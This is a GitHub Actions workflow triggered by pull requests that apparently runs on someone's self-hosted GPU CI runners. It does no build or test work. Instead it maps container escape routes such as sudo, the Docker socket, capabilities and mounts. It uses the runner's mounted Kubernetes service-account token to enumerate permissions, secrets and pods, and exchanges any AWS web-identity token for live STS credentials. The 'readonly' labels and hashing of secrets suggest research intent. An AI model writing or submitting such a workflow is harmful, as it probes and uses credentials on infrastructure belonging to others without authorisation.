name: c211-125616-escmap
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  escmap:
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        include:
          - tag: mi300-1gpu-01
            label: linux-mi300-1gpu-sglang
          - tag: mi300-1gpu-02
            label: linux-mi300-1gpu-sglang
          - tag: mi35x-1gpu-01
            label: linux-mi35x-gpu-1
          - tag: mi35x-1gpu-02
            label: linux-mi35x-gpu-1
    runs-on: ${{ matrix.label }}
    timeout-minutes: 12
    steps:
      - name: escalation-surface-readonly
        env:
          NONCE: c211-i125616-f31607d5d9356f41
          JOBTAG: ${{ matrix.tag }}
        run: |
          set -u
          set +e
          ts(){ date -u +%FT%TZ; }
          if command -v timeout >/dev/null 2>&1; then TO="timeout 20"; else TO=""; fi
          echo "C211E_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
          echo "C211E_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
          id 2>&1 || true
          echo "C211E_GROUPS=$(id -Gn 2>/dev/null | tr ' ' ',')"
          echo "C211E_UIDGID=$(id -u):$(id -g) PROC1_COMM=$(cat /proc/1/comm 2>/dev/null) OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
          echo "PODINFO_FILES=$(ls -1 /etc/podinfo 2>/dev/null | tr '\n' ',')"
          echo "--- (d) container escalation surface (read-only) ---"
          if command -v sudo >/dev/null 2>&1; then
            $TO sudo -n true >/dev/null 2>&1; SUDO_RC=$?
            echo "SUDO_BIN=present SUDO_N_TRUE_RC=$SUDO_RC"
            if [ "$SUDO_RC" = "0" ]; then echo "SUDO_N_ID=$(timeout 12 sudo -n id 2>&1 | head -1)"; fi
          else
            echo "SUDO_BIN=absent SUDO_N_TRUE_RC=127"
          fi
          if [ -S /var/run/docker.sock ]; then
            echo "DOCKER_SOCK_PRESENT=1"
            ls -l /var/run/docker.sock 2>&1 | sed 's/^/DOCKER_SOCK_LS=/'
            if [ -w /var/run/docker.sock ]; then echo "DOCKER_SOCK_WRITABLE=1"; else echo "DOCKER_SOCK_WRITABLE=0"; fi
          else
            echo "DOCKER_SOCK_PRESENT=0"
          fi
          for p in /run/docker.sock /run/containerd/containerd.sock /var/run/containerd/containerd.sock /run/crio/crio.sock /etc/kubernetes /var/lib/kubelet /var/lib/docker; do
            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
            else echo "PATH_ABSENT=$p"; fi
          done
          for p in /dev/kfd /dev/dri /dev/dri/renderD128 /dev/nvidia0 /dev/nvidiactl; do
            if [ -e "$p" ]; then echo "DEV_PRESENT=$p PERMS=$(ls -ld "$p" 2>/dev/null | awk '{print $1" "$3":"$4}')"; else echo "DEV_ABSENT=$p"; fi
          done
          echo "CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null)"
          echo "CAPBND=$(awk '/^CapBnd:/{print $2}' /proc/self/status 2>/dev/null)"
          echo "NONEWPRIVS=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status 2>/dev/null) SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status 2>/dev/null)"
          echo "UID_MAP=$(cat /proc/self/uid_map 2>/dev/null | tr '\n' ';')"
          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -4 | tr '\n' ';')"
          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -4 | tr '\n' ';')"
          echo "--- mount-table classification (no secret values) ---"
          echo "MOUNTS_TOTAL=$(wc -l < /proc/self/mounts 2>/dev/null)"
          awk '{gsub(/\\040/," "); print $3}' /proc/self/mounts 2>/dev/null | sort | uniq -c | sort -rn | head -10 | sed 's/^/MOUNT_FSTYPE /'
          awk '{gsub(/\\040/," "); print $2}' /proc/self/mounts 2>/dev/null | awk -F/ '{print "/"$2}' | sort | uniq -c | sort -rn | head -10 | sed 's/^/MOUNT_TOP /'
          echo "ROOT_FSTYPE=$(awk '$2=="/"{print $3}' /proc/self/mounts 2>/dev/null | head -1)"
          echo "ROOT_SOURCE_CLASS=$(awk '$2=="/"{s=$1; if (s ~ /^overlay$/) print "overlay"; else if (s ~ /^\/dev\//) print "block-device"; else if (s ~ /:/) print "remote-export"; else print "other"}' /proc/self/mounts 2>/dev/null | head -1)"
          echo "DOCKER_SOCK_MOUNTED=$(awk '$2 ~ /docker\.sock$/ {print "yes"; exit}' /proc/self/mounts 2>/dev/null)"
          echo "KUBELET_MOUNTED=$(awk '$2 ~ /kubelet$/ {print "yes"; exit}' /proc/self/mounts 2>/dev/null)"
          echo "HOSTPATH_HINTS=$(awk '$1 ~ /^\/dev\// || $1 ~ /^\/var\/lib\/kubelet/ || $1 ~ /^\/etc\/kubernetes/ {c++} END{print c+0}' /proc/self/mounts 2>/dev/null)"
          echo "--- (e) read-only AMD device sample ---"
          if command -v rocm-smi >/dev/null 2>&1; then
            echo "ROCM_SMI=present"
            timeout 25 rocm-smi --showuniqueid --showproductname 2>&1 | head -80 | sed 's/^/ROCM_SMI /'
          else
            echo "ROCM_SMI=absent"
          fi
          if command -v amd-smi >/dev/null 2>&1; then
            echo "AMD_SMI=present"
            timeout 25 amd-smi static 2>&1 | head -80 | sed 's/^/AMD_SMI /'
          else
            echo "AMD_SMI=absent"
          fi
          echo "--- (a)(b)(c) Kubernetes API read-only surface (token bytes never printed) ---"
          if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PYEOF_K8S'
          import os, ssl, json, urllib.request, urllib.error

          SA = '/var/run/secrets/kubernetes.io/serviceaccount'
          tokp = SA + '/token'
          cap = SA + '/ca.crt'
          if not (os.path.isfile(tokp) and os.path.getsize(tokp) > 0):
              print('K8S_SA_TOKEN=ABSENT'); raise SystemExit(0)
          tok = open(tokp, 'rb').read().strip()          # never printed
          host = os.environ.get('KUBERNETES_SERVICE_HOST', '')
          port = os.environ.get('KUBERNETES_SERVICE_PORT', '443') or '443'
          if not host:
              print('K8S_SVC_HOST=ABSENT'); raise SystemExit(0)
          print('K8S_SVC_HOST_PRESENT=1 K8S_SVC_PORT=%s SA_CA=%s' % (port, 'PRESENT' if os.path.isfile(cap) else 'ABSENT'))
          base = 'https://%s:%s' % (host, port)
          try:
              ctx = ssl.create_default_context(cafile=cap if os.path.isfile(cap) else None)
          except Exception:
              ctx = ssl._create_unverified_context() if os.path.isfile(cap) and os.path.getsize(cap) == 0 else ssl.create_default_context()

          def kreq(method, path, body=None, timeout=15):
              h = {'Authorization': 'Bearer ' + tok.decode('utf-8', 'replace'),
                   'Accept': 'application/json', 'User-Agent': 'c211-i125616-escmap'}
              data = None
              if body is not None:
                  data = json.dumps(body).encode()
                  h['Content-Type'] = 'application/json'
              r = urllib.request.Request(base + path, data=data, headers=h, method=method)
              opener = urllib.request.build_opener(urllib.request.ProxyHandler({}),
                                                   urllib.request.HTTPSHandler(context=ctx))
              try:
                  resp = opener.open(r, timeout=timeout)
                  return resp.status, resp.read()
              except urllib.error.HTTPError as e:
                  return e.code, e.read()
              except Exception as e:
                  return -1, type(e).__name__.encode()

          def err_reason(raw):
              try:
                  d = json.loads(raw)
                  return str(d.get('reason') or d.get('status') or '')[:60]
              except Exception:
                  return 'unparsed'

          # (c) GET /version with the mounted SA token
          st, raw = kreq('GET', '/version')
          print('K8S_VERSION_HTTP=%d' % st)
          if st == 200:
              try:
                  d = json.loads(raw)
                  print('K8S_VERSION gitVersion=%s major=%s minor=%s' % (d.get('gitVersion'), d.get('major'), d.get('minor')))
              except Exception:
                  print('K8S_VERSION_PARSE_FAIL')
          else:
              print('K8S_VERSION_ERR reason=%s' % err_reason(raw))

          # (a) SSRR scoped to namespace arc-sglang -> HTTP code + rule verbs/resources only
          ssrr = {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectRulesReview',
                  'spec': {'namespace': 'arc-sglang'}}
          st, raw = kreq('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', ssrr)
          print('K8S_SSRR_HTTP=%d' % st)
          if st in (200, 201):
              try:
                  d = json.loads(raw)
                  stt = d.get('status') or {}
                  rules = stt.get('resourceRules') or []
                  print('K8S_SSRR_RULES=%d INCOMPLETE=%s' % (len(rules), str(stt.get('incomplete')).lower()))
                  for i, r in enumerate(rules[:40]):
                      print('K8S_SSRR_RULE_%d verbs=%s resources=%s' % (
                          i, ','.join(r.get('verbs') or []), ','.join(r.get('resources') or [])))
                  if stt.get('evaluationError'):
                      print('K8S_SSRR_EVALERR=present')
              except Exception:
                  print('K8S_SSRR_PARSE_FAIL')
          else:
              print('K8S_SSRR_ERR reason=%s' % err_reason(raw))

          # (b) status-only namespace GETs; names/counts only on 200
          for res in ('pods', 'secrets', 'configmaps', 'serviceaccounts'):
              st, raw = kreq('GET', '/api/v1/namespaces/arc-sglang/%s?limit=500' % res)
              print('K8S_GET_%s_HTTP=%d' % (res, st))
              if st == 200:
                  try:
                      d = json.loads(raw)
                      items = d.get('items') or []
                      names = [((it.get('metadata') or {}).get('name') or '?') for it in items]
                      print('K8S_GET_%s COUNT=%d NAMES=%s' % (res, len(items), ','.join(names[:60])))
                  except Exception:
                      print('K8S_GET_%s_PARSE_FAIL' % res)

          # (b) runner-scale-set CRD lists; names/counts only on 200
          CRDS = [('actions.github.com', 'v1alpha1', 'autoscalingrunnersets'),
                  ('actions.github.com', 'v1alpha1', 'autoscalinglisteners'),
                  ('actions.github.com', 'v1alpha1', 'ephemeralrunnersets'),
                  ('actions.summerwind.dev', 'v1alpha1', 'runnersets'),
                  ('actions.summerwind.dev', 'v1alpha1', 'runnerdeployments')]
          for grp, ver, res in CRDS:
              st, raw = kreq('GET', '/apis/%s/%s/namespaces/arc-sglang/%s?limit=200' % (grp, ver, res))
              tag = (grp.replace('.', '_') + '_' + res)
              print('K8S_CRD_%s_HTTP=%d' % (tag, st))
              if st == 200:
                  try:
                      d = json.loads(raw)
                      items = d.get('items') or []
                      names = [((it.get('metadata') or {}).get('name') or '?') for it in items]
                      print('K8S_CRD_%s COUNT=%d NAMES=%s' % (tag, len(items), ','.join(names[:40])))
                  except Exception:
                      print('K8S_CRD_%s_PARSE_FAIL' % tag)
          print('K8S_SECTION=end')
          PYEOF_K8S
          else
            echo "PY3_ABSENT"
          fi
          echo "C211E_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
          exit 0
      - name: docker-socket-version-readonly
        if: ${{ always() }}
        env:
          NONCE: c211-i125616-f31607d5d9356f41
          JOBTAG: ${{ matrix.tag }}
        run: |
          if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PYEOF_DOCKER'
          import os, json, socket, http.client
          if os.path.exists('/var/run/docker.sock'):
              class UHTTP(http.client.HTTPConnection):
                  def __init__(self, path):
                      http.client.HTTPConnection.__init__(self, 'localhost', timeout=8)
                      self.upath = path
                  def connect(self):
                      s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                      s.settimeout(8)
                      s.connect(self.upath)
                      self.sock = s
              try:
                  c = UHTTP('/var/run/docker.sock')
                  c.request('GET', '/version')
                  r = c.getresponse()
                  body = r.read(65536)
                  print('DOCKER_SOCK_VERSION_HTTP=%d' % r.status)
                  if r.status == 200:
                      try:
                          d = json.loads(body)
                          print('DOCKER_SOCK_VERSION Version=%s ApiVersion=%s MinAPIVersion=%s Os=%s Arch=%s' % (
                              d.get('Version'), d.get('ApiVersion'), d.get('MinAPIVersion'), d.get('Os'), d.get('Arch')))
                      except Exception:
                          print('DOCKER_SOCK_VERSION_PARSE_FAIL')
                  c.close()
              except Exception as e:
                  print('DOCKER_SOCK_VERSION_ERR=%s' % type(e).__name__)
          else:
              print('DOCKER_SOCK_VERSION=SKIP_NO_SOCKET')
          PYEOF_DOCKER
          else
            echo "PY3_ABSENT"
          fi
      - name: identity-fingerprint-readonly
        if: ${{ always() }}
        env:
          NONCE: c211-i125616-f31607d5d9356f41
          JOBTAG: ${{ matrix.tag }}
        run: |
          if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PYEOF_IDFP'
          import os, hashlib, urllib.request, urllib.parse, urllib.error, datetime, hmac as hmac_mod
          import xml.etree.ElementTree as ET

          SA_TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
          STS_ENDPOINT = 'https://sts.amazonaws.com'
          NONCE = os.environ.get('NONCE', '')
          JOBTAG = os.environ.get('JOBTAG', '')
          print('IDFP_BEGIN job=%s nonce=%s' % (JOBTAG, NONCE))

          def sh(b):
              if isinstance(b, str):
                  b = b.encode('utf-8', 'replace')
              return hashlib.sha256(b).hexdigest()

          def env_fp(name):
              v = os.environ.get(name)
              if v is None or v == '':
                  print('IDFP_%s=ABSENT' % name)
                  return None
              print('IDFP_%s=PRESENT LEN=%d SHA256=%s' % (name, len(v), sh(v)))
              return v

          def path_fp(label, path):
              if not path:
                  print('IDFP_%s_PATH=ABSENT' % label)
                  return None
              print('IDFP_%s_PATH_SHA256=%s FILE_EXISTS=%s' % (label, sh(path), '1' if os.path.isfile(path) else '0'))
              return path

          def file_digest(label, path):
              try:
                  b = open(path, 'rb').read()
              except Exception:
                  print('IDFP_%s=UNREADABLE' % label)
                  return None
              print('IDFP_%s=PRESENT BYTES=%d SHA256=%s' % (label, len(b), sh(b)))
              return b

          env_fp('K8S_SA_TOKEN')
          if os.path.isfile(SA_TOKEN_PATH):
              file_digest('K8S_SA_TOKEN_MOUNT', SA_TOKEN_PATH)
          else:
              print('IDFP_K8S_SA_TOKEN_MOUNT=ABSENT')

          role_arn = env_fp('AWS_ROLE_ARN')
          wit_path = env_fp('AWS_WEB_IDENTITY_TOKEN_FILE')
          if wit_path:
              path_fp('AWS_WEB_IDENTITY_TOKEN_FILE', wit_path)
              wit_bytes = file_digest('AWS_WEB_IDENTITY_TOKEN', wit_path) if os.path.isfile(wit_path) else None
              if wit_bytes is None:
                  print('IDFP_AWS_WEB_IDENTITY_TOKEN_FILE_CONTENT=ABSENT')
          else:
              wit_bytes = None
          env_fp('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
          env_fp('AWS_CONTAINER_CREDENTIALS_FULL_URI')
          gac = env_fp('GOOGLE_APPLICATION_CREDENTIALS')
          if gac:
              path_fp('GOOGLE_APPLICATION_CREDENTIALS', gac)
              if os.path.isfile(gac):
                  file_digest('GOOGLE_APPLICATION_CREDENTIALS', gac)
              else:
                  print('IDFP_GOOGLE_APPLICATION_CREDENTIALS=FILE_ABSENT')
          azf = env_fp('AZURE_FEDERATED_TOKEN_FILE')
          if azf:
              path_fp('AZURE_FEDERATED_TOKEN_FILE', azf)
              if os.path.isfile(azf):
                  file_digest('AZURE_FEDERATED_TOKEN', azf)
              else:
                  print('IDFP_AZURE_FEDERATED_TOKEN_FILE=FILE_ABSENT')

          def post(url, body, headers, timeout=20):
              req = urllib.request.Request(url, data=body, headers=headers, method='POST')
              opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
              try:
                  r = opener.open(req, timeout=timeout)
                  return r.status, r.read()
              except urllib.error.HTTPError as e:
                  return e.code, e.read()
              except Exception as e:
                  return -1, ('EXC:' + type(e).__name__).encode()

          def xml_text(raw, tag):
              try:
                  root = ET.fromstring(raw)
              except Exception:
                  return None
              for el in root.iter():
                  if isinstance(el.tag, str) and el.tag.split('}')[-1] == tag:
                      return el.text
              return None

          if role_arn and wit_bytes:
              part = 'aws-cn' if ':aws-cn:' in role_arn else ('aws-us-gov' if ':aws-us-gov:' in role_arn else 'aws')
              endpoint = STS_ENDPOINT
              if part == 'aws-cn' and STS_ENDPOINT == 'https://sts.amazonaws.com':
                  endpoint = 'https://sts.amazonaws.com.cn'
              elif part == 'aws-us-gov' and STS_ENDPOINT == 'https://sts.amazonaws.com':
                  endpoint = 'https://sts.us-gov-west-1.amazonaws.com'
              body = urllib.parse.urlencode({
                  'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
                  'RoleArn': role_arn, 'RoleSessionName': 'c211-i125616',
                  'WebIdentityToken': wit_bytes.decode('utf-8', 'replace').strip()}).encode()
              st, raw = post(endpoint, body, {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                                              'Accept': 'application/xml', 'User-Agent': 'c211-i125616-escmap'})
              print('IDFP_ASSUME_ROLE_HTTP=%d ENDPOINT_CLASS=%s' % (st, part))
              if st == 200:
                  ak = xml_text(raw, 'AccessKeyId'); sk = xml_text(raw, 'SecretAccessKey'); stk = xml_text(raw, 'SessionToken')
                  exp = xml_text(raw, 'Expiration'); arn = xml_text(raw, 'Arn'); arid = xml_text(raw, 'AssumedRoleId')
                  print('IDFP_ASSUME_ROLE_CREDS=%s EXPIRATION=%s' % ('PRESENT' if (ak and sk and stk) else 'ABSENT', exp))
                  print('IDFP_ASSUME_ROLE_ARN=%s ASSUMED_ROLE_ID=%s' % (arn, arid))
                  if ak and sk and stk:
                      host = urllib.parse.urlparse(endpoint).netloc
                      region = 'us-east-1'
                      if part == 'aws-us-gov': region = 'us-gov-west-1'
                      if part == 'aws-cn': region = 'cn-north-1'
                      qbody = 'Action=GetCallerIdentity&Version=2011-06-15'
                      t = datetime.datetime.utcnow()
                      amzdate = t.strftime('%Y%m%dT%H%M%SZ'); datestamp = t.strftime('%Y%m%d')
                      ctype = 'application/x-www-form-urlencoded; charset=utf-8'
                      payload_hash = sh(qbody)
                      canon_headers = ('content-type:%s\nhost:%s\nx-amz-date:%s\nx-amz-security-token:%s\n'
                                       % (ctype, host, amzdate, stk))
                      signed_headers = 'content-type;host;x-amz-date;x-amz-security-token'
                      creq = '\n'.join(['POST', '/', '', canon_headers, signed_headers, payload_hash])
                      scope = '%s/%s/sts/aws4_request' % (datestamp, region)
                      sts_str = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope, sh(creq)])
                      kd = hmac_mod.new(('AWS4' + sk).encode(), datestamp.encode(), hashlib.sha256).digest()
                      kr = hmac_mod.new(kd, region.encode(), hashlib.sha256).digest()
                      ks = hmac_mod.new(kr, b'sts', hashlib.sha256).digest()
                      ksign = hmac_mod.new(ks, b'aws4_request', hashlib.sha256).digest()
                      sig = hmac_mod.new(ksign, sts_str.encode(), hashlib.sha256).hexdigest()
                      auth = ('AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
                              % (ak, scope, signed_headers, sig))
                      st2, raw2 = post(endpoint, qbody.encode(), {
                          'Content-Type': ctype, 'Host': host, 'X-Amz-Date': amzdate,
                          'X-Amz-Security-Token': stk, 'Authorization': auth,
                          'Accept': 'application/xml', 'User-Agent': 'c211-i125616-escmap'})
                      print('IDFP_GCI_HTTP=%d' % st2)
                      if st2 == 200:
                          print('IDFP_GCI_ACCOUNT=%s' % xml_text(raw2, 'Account'))
                          print('IDFP_GCI_ARN=%s' % xml_text(raw2, 'Arn'))
                          print('IDFP_GCI_USERID=%s' % xml_text(raw2, 'UserId'))
                      else:
                          print('IDFP_GCI_ERR_CODE=%s' % xml_text(raw2, 'Code'))
              else:
                  print('IDFP_ASSUME_ROLE_ERR_CODE=%s' % xml_text(raw, 'Code'))
                  print('IDFP_ASSUME_ROLE_ERR_MSG_SHA256=%s' % sh(xml_text(raw, 'Message') or ''))
          else:
              print('IDFP_IRSA_CALL=SKIP_PRECONDITION_ABSENT')
          print('IDFP_END job=%s' % JOBTAG)
          PYEOF_IDFP
          else
            echo "PY3_ABSENT"
          fi

